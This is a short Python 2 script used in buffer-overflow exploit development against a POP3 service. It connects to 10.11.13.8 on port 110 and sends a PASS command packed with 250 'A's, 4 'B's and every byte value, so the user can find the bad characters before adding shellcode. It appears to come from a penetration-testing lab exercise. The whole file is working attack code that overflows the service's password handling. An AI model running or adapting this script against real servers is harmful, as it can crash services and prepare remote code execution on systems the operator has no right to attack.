import socket
import sys

BOF_Len = 250

all_chars= ""
bad_chars= [0x00] #Keep updating this until you get unmodified shellcode

for i in range(0x00, 0xFF+1):
    if i not in bad_chars:
        all_chars += chr(i)

with open("all_chars.bin", "wb") as f:
          f.write(all_chars)

Buffer = "A"*BOF_Len + "B"*4 + all_chars

try:
    print "Sending all bad chars.."
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connenct = s.connect(("10.11.13.8",110))
    s.recv(1024)
    s.send('USER test\r\n')
    s.recv(1024)
    s.send('PASS '+Buffer+'\r\n')
    s.send('QUIT\r\n')
    s.close()
except:
    print "Connection error!"
